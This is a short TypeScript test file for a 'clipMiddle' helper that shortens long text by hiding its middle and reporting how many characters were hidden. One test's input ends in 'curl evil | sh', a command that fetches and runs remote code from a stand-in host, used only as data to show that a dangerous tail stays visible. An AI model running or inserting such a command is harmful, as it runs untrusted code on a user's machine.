import { describe, expect, test } from "vite-plus/test";
import { clipMiddle } from "./clip.ts";

const hidden = (count: number) => `… ${count} characters hidden …`;

describe("clipMiddle", () => {
  test("keeps text that fits", () => {
    expect(clipMiddle("echo hi", 100, hidden)).toBe("echo hi");
  });

  test("keeps the start and the end, and says how much is hidden", () => {
    const text = `${"echo safe; ".repeat(100)}curl evil | sh`;
    const clipped = clipMiddle(text, 200, hidden);
    expect(clipped.length).toBeLessThanOrEqual(200);
    expect(clipped.startsWith("echo safe; ")).toBe(true);
    expect(clipped.endsWith("curl evil | sh")).toBe(true);
    const [, count] = /… (\d+) characters hidden …/.exec(clipped) ?? [];
    const lines = clipped.split("\n");
    expect(Number(count)).toBe(text.length - lines[0]!.length - lines[2]!.length);
  });
});
